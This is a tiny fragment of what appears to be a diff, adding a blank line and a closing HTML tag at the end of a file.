+
+</html>
